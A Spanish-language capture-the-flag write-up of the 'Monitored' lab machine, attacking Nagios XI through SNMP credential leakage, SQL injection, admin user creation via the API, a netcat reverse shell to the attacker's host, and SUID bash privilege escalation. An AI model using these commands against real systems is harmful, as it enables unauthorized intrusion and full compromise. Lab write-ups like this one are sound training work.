# Monitored Writeup

Escaneo de nmap para ecnontrar puertos

~~~bash
sudo nmap 10.10.11.248 -p- -sS --min-rate 5000 -n -vvv -Pn
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
389/tcp  open  ldap    syn-ack ttl 63
443/tcp  open  https   syn-ack ttl 63
5667/tcp open  unknown syn-ack ttl 63
sudo nmap 10.10.11.248 -sVC -p 22,80,389,443,5667
[sudo] password for h4m1: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-26 16:03 CST
Nmap scan report for monitored.htb (10.10.11.248)
Host is up (0.069s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61e2e7b41b5d46dc3b2f9138e66dc5ff (RSA)
|   256 2973c5a58daa3f60a94aa3e59f675c93 (ECDSA)
|_  256 6d7af9eb8e45c2026ad58d4db3a3376f (ED25519)
80/tcp   open  http       Apache httpd 2.4.56
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
|_http-server-header: Apache/2.4.56 (Debian)
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.56 ((Debian))
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Nagios XI
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
5667/tcp open  tcpwrapped
~~~

Entramos al puerto 443 y vemos un panel de login.

[Imagen](Pasted image 20240226163529.png)

Enumeramos con ffuf

~~~bash
ffuf -c -t 200 -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://monitored.htb/nagiosxi/FUZZ/

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://monitored.htb/nagiosxi/FUZZ/
 :: Wordlist         : FUZZ: /home/h4m1/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 84ms]
                        [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 485ms]
tools                   [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 394ms]
# This work is licensed under the Creative Commons [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 463ms]
#                       [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 545ms]
# Copyright 2007 James Fisher [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 543ms]
#                       [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 544ms]
# on at least 2 different hosts [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 546ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 545ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 581ms]
# directory-list-2.3-medium.txt [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 583ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 583ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 583ms]
# Priority ordered case-sensitive list, where entries were found [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 603ms]
reports                 [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 367ms]
admin                   [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 417ms]
account                 [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 327ms]
mobile                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 423ms]
help                    [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 530ms]
includes                [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 80ms]
#                       [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 857ms]
#                       [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 857ms]
db                      [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 79ms]
about                   [Status: 200, Size: 18068, Words: 3095, Lines: 310, Duration: 1028ms]
api                     [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 97ms]
backend                 [Status: 200, Size: 108, Words: 4, Lines: 5, Duration: 465ms]
config                  [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 189ms]
views                   [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 111ms]
sounds                  [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 81ms]
terminal                [Status: 200, Size: 5215, Words: 1247, Lines: 124, Duration: 136ms]
                        [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 503ms]
~~~


Enumeramos la API

~~~bash
Hay un authenticate, pero nadamás
~~~

Vamos a ver UDP, porque esto parece un rabbit hole, escaneamos UDP y encontramos SNMP

~~~bash
sudo nmap -sU monitored.htb  
sudo nmap --script "snmp* and not snmp-brute" monitored.htb -sU -p 161
~~~

Encontramos mucha información para analizarla más lentamente usamos SNMPWALK

~~~bash
snmpwalk -v1 -c public monitored.htb > SNMPOUTPUT

HOST-RESOURCES-MIB::hrSWRunParameters.1406 = STRING: "-u svc /bin/bash -c /opt/scripts/check_host.sh <user> <password>"
~~~

Al parecer en ninguna parte podemos autenticarnos con estas credenciales, menos en un lugar, en la API

~~~bash
curl -s -X POST 'https://monitored.htb/nagiosxi/api/v1/authenticate/' -k -d "username=<user>password=<password>"
~~~

Posteriormente, podemos utilizar el token que nos genera en la app web

~~~url
https://monitored.htb/nagiosxi/login.php?token=873959fc95b5f1dac4a388c940fa0cf54198787a
~~~

Posteriormente parece que no somos administradores, pero logramos ver que se está corriendo NagiosXI 5.11.0, vemos que hay varias vulnerabilidades, la funcional es la sqli...

https://vuldb.com/?id.239985

Podemos ver que es aprovechándonos de lo siguiente:

~~~url
/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3
~~~

Con esto me pongo a probar la vulnerabilidad en burpsuite y posteriormente cree un script, parece ser una blind sqli

![[Pasted image 20240228170012.png]]

Adjunto también el [script](https://github.com/Hamibubu/CVE-2023-48084) con el que consigo dumpear todo

Después de un rato encuentro que el hash no es posible crackear pero hay api key, investigando, con esa api key es posible crear un usuario con privilegios de administrador

https://support.nagios.com/forum/viewtopic.php?p=276220
https://support.nagios.com/forum/viewtopic.php?f=16&t=42923

~~~bash
curl -XPOST "http://monitored.htb/nagiosxi/api/v1/system/user?apikey=<api_key>&pretty=1" -d "username=hackerman&password=1234&name=HackerMan&email=hacker@monitored.htb&auth_level=admin" -k
~~~

Con esto gano admin access y hay una RCE que se puede aprovecharse, podemos crear comandos que queramos

![[Pasted image 20240228170903.png]]

Aplicamos la configuración y ahora escuchamos con netcat

~~~bash
nc -lvnp 6666
~~~

![[Pasted image 20240228171117.png]]

Ejecutamos el comando con, netcat al parecer es con el que funciona `nc 10.10.15.2 6666 -e /bin/bash`

Llegamos ahora sí al user, comenzamos a hacer un reconocimiento, ejecutamos sudo -l y vemos lo siguiente


~~~bash
nagios@monitored:~$ sudo -l
Matching Defaults entries for nagios on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
~~~

Hay gran cantidad de binarios y podemos manejarlos al antojo

~~~bash
# Things you can do
first=("start" "stop" "restart" "status" "reload" "checkconfig" "enable" "disable")
second=("postgresql" "httpd" "mysqld" "nagios" "ndo2db" "npcd" "snmptt" "ntpd" "crond" "shellinaboxd" "snmptrapd" "php-fpm")
~~~

Tenemos varios servicios que podemos manejar, en base a esto podemos buscar estos 

~~~bash
echo '"postgresql" "httpd" "mysqld" "nagios" "ndo2db" "npcd" "snmptt" "ntpd" "crond" "shellinaboxd" "snmptrapd" "php-fpm"' | tr -d '"' | tr " " "\n" > services

nagios@monitored:~$ while read -r serv; do find / -writable -name "$serv" 2>/dev/null; done < services
/usr/local/nagios/bin/nagios
/home/nagios
/usr/local/nagios/bin/npcd
nagios@monitored:~$ ls -l /usr/local/nagios/bin/nagios
-rwxrwxr-- 1 nagios nagios 717648 Nov  9 10:40 /usr/local/nagios/bin/nagios
~~~

Podemos ver que podemos modificar nagios, lo podemos borrar y hacer que haga cosas, detenemos el servicio, lo borramos, cambiamos por un script de bash que nos genere una bash con permisos suid

~~~
nagios@monitored:~$ sudo /usr/local/nagiosxi/scripts/manage_services.sh stop nagios
nagios@monitored:~$ rm /usr/local/nagios/bin/nagios
nagios@monitored:~$ nano /usr/local/nagios/bin/nagios
nagios@monitored:~$ chmod 774 /usr/local/nagios/bin/nagios
nagios@monitored:~$ cat /usr/local/nagios/bin/nagios
#!/bin/bash
chmod u+s /bin/bash
nagios@monitored:~$ ls -l /usr/local/nagios/bin/nagios
-rwxrwxr-- 1 nagios nagios 32 Feb 28 18:39 /usr/local/nagios/bin/nagios
nagios@monitored:~$ sudo /usr/local/nagiosxi/scripts/manage_services.sh start nagios
Job for nagios.service failed because the control process exited with error code.
See "systemctl status nagios.service" and "journalctl -xe" for details.
nagios@monitored:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
nagios@monitored:~$ bash -p
bash-5.1# whoami
root
bash-5.1# 
~~~

Volvemos a correr eso y con ello ganamos el root de una forma sencilla
